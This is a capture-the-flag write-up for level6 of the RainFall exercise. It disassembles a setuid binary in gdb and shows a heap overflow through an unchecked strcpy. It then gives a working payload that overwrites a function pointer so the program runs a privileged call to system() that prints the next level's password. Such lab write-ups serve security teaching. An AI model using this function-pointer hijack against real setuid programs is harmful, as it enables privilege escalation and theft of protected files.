# level6
level6@RainFall:~$ file level6 
level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped


at start gdb show the stack trace
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
(gdb) 
```
## steps

```bash 
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   ```
allocat 64 byte and store the address in 0x1c(%esp) "esp + 28"

```bash

   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   ```
allocat 4 byte and store the address in 0x18(%esp) "esp + 24"

```bash
0x080484a5 <+41>:	mov    $0x8048468,%edx
```

load the address of m into edx "the 4 allocation"



so the program reserve a memory space of 64 byte, and then it coppy the input expected with strcoppy to it and calls the function `m` but the n function is not being called .

```bash
(gdb) disas m 
Dump of assembler code for function m:
   0x08048468 <+0>:	push   %ebp
   0x08048469 <+1>:	mov    %esp,%ebp
   0x0804846b <+3>:	sub    $0x18,%esp
   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave  
   0x0804847b <+19>:	ret    
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.
```


let check the argument passed to the system call which is 0x80485b0 content:

```bash 
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
```

```bash
level6@RainFall:~$ gdb -q ./level6 
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
(gdb) 
```

after all we need to use the strcoppy vulnerability to get to the n function , 

now lets calculate the offset and overflow it to overide the m function with the n function.

```bash
level6@RainFall:~$ gdb -q ./level6 
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) break *0x080484ca  # a breakpoint after the strcpy
Breakpoint 1 at 0x80484ca
(gdb) run $(python -c 'print "A"*64 + "BBBB"') # overflow the buffer after filling the bufferallocated with A which is 414141 pattern and then add the 4 bytes fill pattern BBBB just to visualise 
Starting program: /home/user/level6/level6 $(python -c 'print "A"*64 + "BBBB"')

Breakpoint 1, 0x080484ca in main ()
(gdb) x/wx $esp+0x18 # check the value of the esp+0x18 which is the address of the m function stored
0xbffff6d8:	0x0804a050
(gdb)  x/wx 0x0804a050
0x804a050:	0x08048468 # here it is the address of the m function stored
(gdb) x/wx $esp+0x1c # check the value of the esp+0x1c which is the address of the buffer start 
0xbffff6dc:	0x0804a008
(gdb)  x/64wx 0x0804a008 # check the content of the buffer 
0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141 # here it is the buffer filled with A ends
0x804a048:	0x42424242	0x00000000	0x08048468	0x00000000 # here it is the BBBB pattern and the address of the m function stored with a 4 byes padding in between
0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0f8:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) 
```

so the offset is 64 + 8 = 72 bytes

- we will use the n function addres in little indian byte order which is 0x08048454 => 0x54 0x84 0x04 0x08


our payload is  
```bash 
$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

here we go 
```bash 
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ 
```